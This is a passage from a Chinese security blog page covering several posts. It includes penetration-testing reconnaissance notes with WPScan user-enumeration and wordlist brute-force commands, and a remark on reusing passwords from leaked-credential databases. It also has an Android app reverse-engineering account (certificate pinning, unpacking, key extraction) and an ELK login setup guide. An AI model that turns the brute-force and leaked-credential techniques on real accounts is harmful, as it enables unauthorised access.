敏感目录文件收集"></a>6 敏感目录文件收集</h1><p>攻防测试中探测web目录和隐藏的敏感文件是很重要环境，从中可以获取网站后台管理页面、文件上传界面、备份文件、WEB-INF、robots、svn和源代码等。</p><p>主要通过工具扫描，主要有</p><p>（0）御剑–很强大（互联网有很多字典加强版）</p><p>（1） dirb 目录爆破dirb是必用的一款工具，因为它可以做目录的递归爆破</p><p>（2）7kbstorm <a target="_blank" rel="noopener" href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p>（3）搜索引擎（Google、baidu、bing等），搜索引擎搜索敏感文件也较为常见，一般是这样：site:xxx.xxx filetype:xls。</p><p>（4）爬虫-扫描器（AWVS、Burpsuite、Nessus等）</p><p>（5）BBscan（lijiejie大佬的脚本：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScastorn">https://github.com/lijiejie/BBScastorn</a> ）</p><p>（6）凌风云搜索：<a target="_blank" rel="noopener" href="https://www.lingfengyun.com/%EF%BC%88%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E5%8F%AF%E8%83%BD%E4%B8%8A%E4%BC%A0%E4%BA%91%E7%9B%98%E8%A2%AB%E5%9C%A8%E7%BA%BF%E6%8A%93%E5%8F%96%EF%BC%89">https://www.lingfengyun.com/（部分用户可能上传云盘被在线抓取）</a></p><p>（6）github搜索</p><h1 id="7-社会工程学收集"><a href="#7-社会工程学收集" class="headerlink" title="7 社会工程学收集"></a>7 社会工程学收集</h1><p>我们可以通过社工库查询一些关键信息。对于很多社工库来说，存储达到T，数据量达到亿级别都是小case。内容方面包括帐号密码、邮箱地址、个人信息等等。</p><p>互联网社工库，威力有多大，就看数据库的数量和质量了，理论上达到了一定的量，很多的东西都是可以查的出来的，特别是那些基本所有网站都一个密码的，只要一个社工库的收集的其中一个数据库有他的帐号密码，那么查出来的密码就可以直接登陆该用户的其他帐号了。</p><h1 id="8-常见CMS扫描"><a href="#8-常见CMS扫描" class="headerlink" title="8 常见CMS扫描"></a>8 常见CMS扫描</h1><h2 id="8-1-wordpress"><a href="#8-1-wordpress" class="headerlink" title="8.1 wordpress"></a>8.1 wordpress</h2><p><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。</p><h3 id="8-1-1-安装教程"><a href="#8-1-1-安装教程" class="headerlink" title="8.1.1 安装教程"></a>8.1.1 安装教程</h3><p>（1）安装：</p><p>windows平台不支持，kaili系统自带，其他平台安装教程见：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><p>你可以使用下列命令在自己的设备中安装WPScan</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）更新</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --update <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-1-2-使用"><a href="#8-1-2-使用" class="headerlink" title="8.1.2 使用"></a>8.1.2 使用</h3><p><strong>（1）扫描漏洞</strong></p><pre><code>wpscan --url https://www.xxxxx.wiki/</code></pre><p>结果中红色为高危漏洞，绿色为Info</p><p><strong>（2）扫描用户</strong></p><pre><code>wpscan --url https://www.xxxxxxx.wiki/ --enumerate u</code></pre><p>获取用户名后，可以进一步加字典爆破：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -e u --wordlist /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(3) 扫描插件漏洞</p><p>扫描所用插件：wpscan -u <a target="_blank" rel="noopener" href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki/</a> -enumerate p</p><p>扫描插件漏洞：wpscan -u <a target="_blank" rel="noopener" href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki/</a> -enumerate vp</p><p>(4)扫描主题</p><p>扫描主题：wpscan –url <a target="_blank" rel="noopener" href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki</a> –enumerate t</p><p>扫描主题漏洞：wpscan –url <a target="_blank" rel="noopener" href="https://www.xxxxxx.wiki/">https://www.xxxxxx.wiki</a> –enumerate vt</p><p>(5)文件漏洞扫描</p><pre><code>wpscan -u https://www.xxxxxx.wiki/ -enumerate tt</code></pre><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><h1 id="9-福利"><a href="#9-福利" class="headerlink" title="9 福利"></a>9 福利</h1><h2 id="9-1-强大的搜索引擎"><a href="#9-1-强大的搜索引擎" class="headerlink" title="9.1 强大的搜索引擎"></a>9.1 强大的搜索引擎</h2><p>ZoomEy：<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>FoFa：<a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></p><p>Dnsdb：<a target="_blank" rel="noopener" href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p><p>Shodan：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></p><p>Censys：<a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a></p><p>御剑全家桶：<a target="_blank" rel="noopener" href="http://www.moonsec.com/post-753.html">http://www.moonsec.com/post-753.html</a></p><h2 id="9-2-工具"><a href="#9-2-工具" class="headerlink" title="9.2 工具"></a>9.2 工具</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53112370">2019年Github上开源的安全渗透攻击类工具</a></p><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261711.htm">2020版 github渗透测试工具库</a></p><p>参考：</p><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/243210.html">https://www.freebuf.com/articles/web/243210.html</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul></div><span class="post-count">总字数2.6k</span> <span class="post-count">预计阅读10分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-pt-tools" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/28/pt-tools/" class="article-date"><time class="published" datetime="2020-09-28T03:14:51.000Z" itemprop="datePublished">2020-09-28 发布</time> <time class="updated" datetime="2020-09-28T07:09:10.075Z" itemprop="dateUpdated">2020-09-28 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/28/pt-tools/">最佳网络安全和黑客软件</a></h1></header><div class="article-entry" itemprop="articleBody"><h1 id="1-Probely"><a href="#1-Probely" class="headerlink" title="1.Probely"></a>1.Probely</h1><p><a target="_blank" rel="noopener" href="https://probely.com/web-vulnerability-scanner/security-teams/">https://probely.com/web-vulnerability-scanner/security-teams/</a></p><p>probly扫描网络中的漏洞，帮助安全专业人员识别关键漏洞并及时修复。主要功能包括扫描SQL注入、XSS、应用程序漏洞等等。通过与JIRA和Slack的深入集成，此工具允许多个团队成员为整个网络评估过程做出贡献。入侵检测机制是一个额外的优势，以及各种网络报告。Probely扫描您的网络，不会留下任何东西，为安全专业人员带来更好的可见性。</p><h1 id="2-Netsparker"><a href="#2-Netsparker" class="headerlink" title="2.Netsparker"></a>2.Netsparker</h1><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/">https://www.netsparker.com/</a></p><p>Netsparket是另一个漏洞评估工具，它扫描网络中的SQL注入、XSS和其他web应用程序漏洞。这是一个云端和场所。Netsparket的最佳优点包括基于扫描技术的精确检测和特定证据。它还检测URL重写和404错误页面，以及与bug跟踪协议的无缝集成。高速扫描将是另一个特长，它可以在一天内扫描1000个网络应用程序。</p><h1 id="3-Wallarm"><a href="#3-Wallarm" class="headerlink" title="3.Wallarm"></a>3.Wallarm</h1><p><a target="_blank" rel="noopener" href="https://wallarm.com/">https://wallarm.com/</a></p><p>Wallarm结合了机器学习来模拟api、应用程序和其他服务的安全性。这种与机器学习的集成使它能够测试并帮助DevOps部门在整个网络基础设施中设计更好的工作流。Wallarm的自动化WAF将与公共云、私有云和混合云协同工作，最终与AWS、CNCF和Google建立了良好的合作关系。Wallarm中的AI引擎帮助开发人员识别数据模式，利用引擎先前的遭遇消除弱点，帮助他们开发强大的安全代码，</p><h1 id="4-Acunetix"><a href="#4-Acunetix" class="headerlink" title="4.Acunetix"></a>4.Acunetix</h1><p><a target="_blank" rel="noopener" href="https://www.acunetix.com/">https://www.acunetix.com/</a></p><p>Acunetix是安全专业人士最好的软件之一，因为它模仿黑客，从而使安全专业人士领先网络罪犯一步。它负责HTML5、JavaScript、SQL注入、XSS等等。所有的web应用程序和服务都被清楚地监控，以便更好地为任何意外的失败做好准备。除了web应用程序的漏洞之外，这一个还负责WordPress核心和插件。凭借快速扫描功能，Acunetix也是一个重要的软件安全专业人士需要拥有的。</p><h1 id="5-BurpSuite"><a href="#5-BurpSuite" class="headerlink" title="5.BurpSuite"></a>5.BurpSuite</h1><p><a target="_blank" rel="noopener" href="https://portswigger.net/">https://portswigger.net/</a></p><p>Burpuite是一款优秀的web应用程序安全和黑客软件，用于安全测试；它的功能提供了重要的渗透测试程序。从映射到应用程序攻击向量的分析，这个工具是渗透测试团队的正确软件包。自动扫描程序、漏洞管理框架、广泛的法规遵从性报告、详细的扫描方法使Burpuite成为下一代安全评估工具。</p><h1 id="6-Angry-IP-Scanner"><a href="#6-Angry-IP-Scanner" class="headerlink" title="6.Angry IP Scanner"></a>6.Angry IP Scanner</h1><p><a target="_blank" rel="noopener" href="https://angryip.org/">https://angryip.org/</a></p><p>Angry IP scanner是一款开源黑客软件，涵盖跨平台，为安全专业人士提供道德黑客功能。扫描本地网络、文件、命令行界面，以及许多数据获取程序，还可以帮助进行大量的数据导出。</p><h1 id="7-Qualys-Guard"><a href="#7-Qualys-Guard" class="headerlink" title="7.Qualys Guard"></a>7.Qualys Guard</h1><p><a target="_blank" rel="noopener" href="https://www.qualys.com/">https://www.qualys.com/</a></p><p>Qualy Guard是另一家主要的安全供应商，帮助企业简化网络的安全性和法规遵从性。这个网络安全和黑客软件也有助于企业检查他们的云系统漏洞。处理数据漏洞、可见性、数据分析、实时威胁等。可靠性、准确性和简单性是Qualyguard的最佳优势。</p><h1 id="8-HashCat"><a href="#8-HashCat" class="headerlink" title="8.HashCat"></a>8.HashCat</h1><p><a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><p>HashCat是一个密码破解软件，它可以帮助恢复忘记的密码，并检查密码历史记录以执行审核和报告。</p><p>它是一个开放源代码平台，涵盖跨平台，负责同一网络内的多个设备，该平台配有集成的热监视器、内置基准系统，并支持分布式破解网络。最重要的是，它还支持网络的自动性能管理。</p><h1 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h1><p><a target="_blank" rel="noopener" href="https://www.softwaretestinghelp.com/penetration-testing-tools/">https://www.softwaretestinghelp.com/penetration-testing-tools/</a></p><p><a target="_blank" rel="noopener" href="https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html">https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul></div><span class="post-count">总字数988</span> <span class="post-count">预计阅读3分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-mobilesecurity-experience" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/18/mobilesecurity-experience/" class="article-date"><time class="published" datetime="2020-09-18T09:02:36.000Z" itemprop="datePublished">2020-09-18 发布</time> <time class="updated" datetime="2021-02-18T06:34:27.581Z" itemprop="dateUpdated">2021-02-18 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/18/mobilesecurity-experience/">小白如何在三天一步步逆向app，找到私钥</a></h1></header><div class="article-entry" itemprop="articleBody"><h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1  工具"></a>1 工具</h1><h2 id="1-1-抓包工具"><a href="#1-1-抓包工具" class="headerlink" title="1.1 抓包工具"></a>1.1 抓包工具</h2><table><thead><tr><th>工具名称</th><th>使用平台</th><th>抓包类型</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Wireshark</td><td>linux、windows</td><td>网络7层协议</td><td>linux平台支持好,功能强大，可抓网络7层的包</td><td>不能解析https的内容</td></tr><tr><td>Fidder</td><td>windows</td><td>http，https 和FTP协议</td><td>功能强大，支持修改报文，重放报文</td><td>仅支持windows</td></tr><tr><td>Charles</td><td>window、Mac</td><td>http,socket</td><td>可以按照域名进行分层级查看</td><td>需要收费</td></tr><tr><td>BurpSuite</td><td>支持java的平台</td><td>http,https</td><td>黑客喜欢用的功能强大工具，可以重放包，篡改包等进行一些包的攻击。</td><td>界面不是很好看</td></tr><tr><td>HttpCanary</td><td>Android</td><td>http,https，WebSocket</td><td>使用方便</td><td>只支持Android</td></tr></tbody></table><p>手机只能安装crt证书</p><h2 id="1-2-反汇编工具"><a href="#1-2-反汇编工具" class="headerlink" title="1.2 反汇编工具"></a>1.2 反汇编工具</h2><table><thead><tr><th>描述</th><th>所需要软件</th><th>步骤</th><th>优缺点</th></tr></thead><tbody><tr><td>较老一套</td><td>dex2jar:将dex转化成jar<br>JD-GUI : 反编译jar中的源码<br>apktool.jar</td><td><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a></td><td>使用复杂</td></tr><tr><td>上面工具的封装</td><td>AndroidKiller_v1.3.1</td><td><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/fl-android-re-tut/content/3.1.html">AndroidKiller教程</a></td><td>使用复杂</td></tr><tr><td>强大</td><td>jadx</td><td>直接拖apk到即可</td><td>使用方便</td></tr></tbody></table><h2 id="1-3-查壳工具："><a href="#1-3-查壳工具：" class="headerlink" title="1.3 查壳工具："></a>1.3 查壳工具：</h2><p>ApkScan</p><h2 id="1-4-脱壳工具："><a href="#1-4-脱壳工具：" class="headerlink" title="1.4 脱壳工具："></a>1.4 脱壳工具：</h2><p>反射大师，FDEX等</p><h1 id="2-逆向经历"><a href="#2-逆向经历" class="headerlink" title="2 逆向经历"></a>2 逆向经历</h1><p>本人今年应届生，就职于甲方安全，研究生期间主要做开发，偶尔做做渗透，护护网；工作了呢，主要维护内部系统的安全，对于移动逆向这块，只简单用burpsuite，顺顺利利抓过app的包。突然有一天，老大说，有个app，fiddler抓包，服务器不响应客户端发的包，让看看咋回事？于是就有了接下来三天不吃不喝不眠不休的入坑爬坑的过程~·所有用到的工具，都在文章开头列出·文章废话比较多，为了使各位看客看的明白，先抛出整个爬坑过程：</p><p><strong>抓包–》反汇编–》脱壳–》拿到私钥</strong></p><h2 id="2-1-抓包"><a href="#2-1-抓包" class="headerlink" title="2.1 抓包"></a>2.1 抓包</h2><p>话说回来，老大说fiddler抓包失败，于是乎，从网上下载fillder，用我的oppo手机装上证书，开始了第一次fiddler抓包之旅，网上随手找一篇<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5a353e164e7c">抓包攻略</a>，发现连接失败，（这里有个坑：公司网络刚好不可以访问这个app，开始弄了好久，都是0字节，后面换了自己热点，就出现连接失败，说到这里真的想吐槽公司网络）</p><p>接着用我最熟悉的burpsuite抓包，发现抓不了https的包，证书也安装了呀，其他https请求都可以抓，刚开始以为是证书的问题，并且app，始终报错，证书校验错误，让我更加以为是证书的问题。。但是又没办法解决，，就想着再换个抓包工具，charls抓包后send成功，但是response都失败了。</p><p>这时候打开微信问问我以前实验室的大佬，听说现在搞app逆向，他推荐了一款手机抓包神器httpCanary，直接安装到手机，抓包是超级方便呀，但是令人奔溃的是app依旧报错，证书校验错误，到这里内心很奔溃，开始网上搜，抓包失败，发现了这篇文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>，猜测可能app使用了双向认证或SSL-pinning(证书绑定) ，并谷歌这两个词汇，理解如下：</p><p><strong>单向认证：</strong>一般的客户端所作的都是单向认证，即客户端只需要验证服务器端的证书，确保服务器来源的可靠性，服务器端无需验证客户端证书。</p><p><strong>双向认证：</strong>客户端验证服务器端证书，服务器端也需要验证客户端证书。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602240311892.png" alt="1602240311892"></p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58204817"><strong>SSL-pinning(证书绑定)：</strong></a></p><p><img src="/2020/09/18/mobilesecurity-experience/1602298885190.png" alt="1602298885190"></p><p>如上图所示： 证书锁定（SSL/TLS Pinning）提供了两种绑定方式： Certificate Pinning 和 Public Key Pinning，过程如下：</p><p>1）：首先对服务器端证书/证书中的公钥进行哈希，得到ssl指纹内置到app中。</p><p>2）：通信连接时，服务器发来证书。</p><p>3）：app对该证书进行哈希操作，将哈希值与app内置的ssl指纹进行对比，若对比成功，则建立连接，否则，断开连接。</p><p>弄懂双向认证和ssl-pinning原理后，结合中间人攻击原理（如下图），进行猜想如下：</p><p>1）如果该app使用的双向认证，即同时认证客户端证书，则在下图中间人与服务器端的交互中，中间人需要提供app的证书。客户端与中间人交互正常。</p><p>2）如果该app使用的是ssl-pinning，即客户端需要对服务器证书进行校验，则在下图客户端与中间人交互中，中间人的需要提供原有服务器端的证书。中间人与服务器端交互正常。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602299413602.png" alt="1602299413602"></p><p>无论是app证书还是服务器端证书，女生第六感觉得app中可能会有，因此下一步想着逆向app，看下app里面有没有证书啥的，然后代理绑定原有证书就可以正常抓包了。（后面发现我是有多天真）</p><h2 id="2-2-反汇编"><a href="#2-2-反汇编" class="headerlink" title="2.2 反汇编"></a>2.2 反汇编</h2><p>开始网上搜索apk反汇编教程，搜到了一篇超详细利用四件套反汇编apk教程，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a> ,按照他的步骤，先解压apk，查看解压后的文件发现了几个证书，一个后缀为cer的证书（看到这个证书个人感觉app应该用了双向认证吧，当时我愚蠢的以为这个证书即是服务器证书，也是客户端证书，因此下一步目标明确为：代理安装客户端证书即可），一个后缀为bks的deb_keystore.bks（这个时候我还不知道bks是啥）。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602311148129.png" alt="1602311148129"></p><p>下一步目标为中间人代理安装app客户端证书，我常用的工具为burpsuite，发现其可以导入客户端证书，在user options-&gt;ssl-Clinet ssl certificates下：<img src="/2020/09/18/mobilesecurity-experience/1602312160658.png" alt="1602312160658"></p><p>后面发现burp suite只可导入pem类型的证书，且需要输入密码，这时候我天真的以为密码可以读取反汇编后的源码中找，然后将可以将cer证书转为pem 证书，就可以成功导入客户端证书。但是反汇编后的dex源码可读性很差，并没有得到有用的东西，又看看cer证书转为pem证书格式，发现需要私钥，哎，这个时候打开微信，找找以前实验室的大佬，有没有好的反汇编工具推荐（这个时候一直以为反汇编工具不行），大佬推荐了jadx神器，直接拖拉apk即可，但是反汇编出的代码可读性仍然不太高，并没有有用的信息。但是收获了，不同格式证书的区别，<a href>总结在此</a>。于是又开始不断地谷歌，能否绕过ssl pinning(此时我也不确定是不是用了证书绑定还是双向认证，但是总得做点啥吧)，网上绕过ssl pinning需要 JustTrustMe，root手机啥的，我这刚买的oppo，也不能root呀，变搬砖了没钱买呀。尝试用模拟器呢，这个app简直了，首先尝试强大的夜神模拟器，app打开没反应，接着逍遥模拟器失败，mumu模拟器失败，天天模拟器失败，哎筋疲力尽的一天··········出去上了个厕所透透气 回来，app到底是不是用了ssl pining?或者双向认证？？？于是用httpCanary重新抓包详细看看了，这个时候突然有了重大发现，httpCanary抓包失败，有报错信息如下：</p><p><img src="/2020/09/18/mobilesecurity-experience/1602315130773.png" alt="1602315130773"></p><p>抓包失败因为Android 7.0以上，系统就不会信任安装用户的证书，也就是说，android不信任装的httpCanary根证书，当app进行交互时，没有可信任的根证书，因此交互失败。从下图的流程图可以看到，如果根证书可信，才会去判断该证书是否校验成功（ssl pinning/双向认证成功），因此，该app可能没有做双向认证或者ssl pinning，做没做找个android 7.0以下的手机试试就知道了。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602316415405.png" alt="1602316415405"></p><p>第二天，从家里拿了个之前的老手机，android 6.0系统的，安装httpcanary抓包，安装目标app，进行登录，突然发现旧手机的触屏有问题，刚好按密码那块失灵了<del>我的天啊</del>··真的命途多舛，<del>·后面灵机一动，可以放大屏幕，移动到触屏好的区域输入即可（我可真是个小机灵鬼）</del>果然抓包成功！！！1喜大普奔啊啊啊啊<del>·昨天一天我是在搞啥呀</del>····</p><p>然后贼开心的去找老大，说可以抓到包了，老大说通信内容可以解密么？需要看通信数据。分析下报文发现：</p><p>客户端app发送给服务器端用的是sm2密文(客户端存sm2公钥加密，服务器端存私钥解密)，服务器端发送给客户端app的是AES密文（客户端和服务器端都存有AES对称密钥），即使逆向app，也只能发现AES密钥，sm2密钥存在服务器端，哎找到一个是一个吧，然后又开始漫漫长路~·…..</p><h2 id="2-3-脱壳"><a href="#2-3-脱壳" class="headerlink" title="2.3 脱壳"></a>2.3 脱壳</h2><p>之前反汇编的源码都没啥结果，又谷歌发现app是不是加了壳，做了代码混淆啥的，于是网上下载了查壳工具ApkScan，果然发现该app加了阿里聚安全的壳。然后在旧手机上开始了一系列脱壳之旅：</p><p>（1）首先使用网上教程<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>,进行脱壳，（旧手机手机安装 VirtualXposed，FDex2+total conmander（自带amaze文件管理器下载打开失败）），但是并没有在data/data目录文件夹中看到dex文件，脱壳失败。</p><p>（2）然后使用网上超牛的反射大师进行脱壳，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>，使用反射大师3.0，3.5版本，脱壳后有5个dex文件，但是源码可读性还是较差，没有找到有用代码，感觉脱壳还是失败。</p><p>（3）尝试其他脱壳工具，。。都一一失败<del>···一无所获</del>·不知所向~···</p><p>就这样又一天过去了~····回家睡觉</p><p>第三天换了清醒的脑袋，开始查看别人的脱壳经历，逆向app经历，突然发现一篇有趣的文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60392573">为了抓包某app,我折腾了10天,原来他是用SSL Pinning防抓包的</a>，看到楼主的经历，我内心也好过多了，翻看评论时候，看到有个读者提问密钥是怎么获取的，楼主说从低版本获取，这可是个重要信息呀。我立刻从网上下载了低版本，利用反射大师一顿操作猛如虎，逆向出8个dex文件，有7M,9M的，心想这下有希望了，果然逐个打开dex搜索AES，惊喜发现AES密钥：果然利用在线AES解密成功。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602320940221.png" alt="1602320940221"></p><p>再搜索sm2_encrypt，发现sm2公钥和疑似sm2私钥（我的天，猜测app工程师用于测试忘记删除了）</p><p><img src="/2020/09/18/mobilesecurity-experience/1602321152209.png" alt="1602321152209"></p><p>将dex转为jar，IDE导入该库文件，调用apk中的sm2加解密函数，成功解密出交互密文！！</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>头秃的三天终于结束了！！只是一个记录小白逆向app的心酸过程，总结三点如下：</p><p>（1）逆向低版本app，这个真的是太重要了</p><p>（2） 安卓模拟器运行app失败后，最好用Android7.0以下进行测试。</p><p>（ 3）要有一个强大的内心和一直转的脑子<del>搞不动了可以换换方向，说不定柳暗花明又一村呢</del>···</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a></p><p>2 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58204817">证书锁定SSL Pinning简介及用途</a></p><p>3 <a target="_blank" rel="noopener" href="https://crifan.github.io/app_capture_package_tool_charles/website/appendix/reference.html">破解https的SSL Pinning</a> 很详细</p><p>4 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/11609825.html">Androidkiller反汇编失败的解决方案</a> 能不用就不用，太复杂啦</p><p>5 <a target="_blank" rel="noopener" href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">证书格式互转</a> 很nice 虽然我没用到</p><p>6 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a> 很详细 但是 Amaze 文件管理器下载打开失败，尝试用<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36001685/article/details/101020843">total conmander</a>成功</p><p>7 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a> 很nice，</p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" rel="tag">移动安全</a></li></ul></div><span class="post-count">总字数3.1k</span> <span class="post-count">预计阅读10分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-elk-login" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/11/elk-login/" class="article-date"><time class="published" datetime="2020-09-11T09:59:18.000Z" itemprop="datePublished">2020-09-11 发布</time> <time class="updated" datetime="2021-02-18T06:29:45.661Z" itemprop="dateUpdated">2021-02-18 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/11/elk-login/">elk登陆设置</a></h1></header><div class="article-entry" itemprop="articleBody"><p>给ES和kibana设置用户登陆，或者使用nginx限制IP或用户访问。本文介绍ELK自带的创建用户的方式。 首先贴了张网上的图可以看到ELK架构使用图。</p><p><img src="https://images2018.cnblogs.com/blog/790307/201803/790307-20180313090706209-1391916396.jpg" alt="img"></p><h1 id="1-修改ES配置开启X-PACK"><a href="#1-修改ES配置开启X-PACK" class="headerlink" title="1 修改ES配置开启X-PACK"></a>1 修改ES配置开启X-PACK</h1><p>修改配置文件elasticsearch.yml内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vi /etc/elasticsearch/elasticsearch.yml</span>

http.cors.enabled: <span class="token boolean">true</span>
http.cors.allow-origin: <span class="token string">"*"</span>
http.cors.allow-headers: Authorization
xpack.security.enabled: <span class="token boolean">true</span>
xpack.security.transport.ssl.enabled: <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/elk-login/1603957755321.png" alt="1603957755321"></p><p>重启ES：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart elasticsearch</span>
<span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status elasticsearch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-创建用户"><a href="#2-创建用户" class="headerlink" title="2 创建用户"></a>2 创建用户</h1><p>输入下列命令后，一次输入各个账户的密码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /usr/share/elasticsearch</span>
<span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/elasticsearch-setup-passwords interactive</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内置账户的含义：<br>elastic内置超级用户。请参阅内置角色。<br>kibana用户Kibana用于连接Elasticsearch并与之通信。<br>logstash_system:Logstash用户在Elasticsearch中存储监视信息时使用。<br>beats_system:eats在Elasticsearch中存储监控信息时使用的用户。<br>apm_system:APM服务器在Elasticsearch中存储监视信息时使用的用户。<br>remote_monitoring_user:Metricbeat用户在Elasticsearch中收集和存储监控信息时使用。它具有remote_monitoring_agent和 remote_monitoring_collector内置的角色。</p><p><img src="/2020/09/11/elk-login/1603958077193.png" alt="1603958077193"></p><h1 id="3-修改Kibana配置"><a 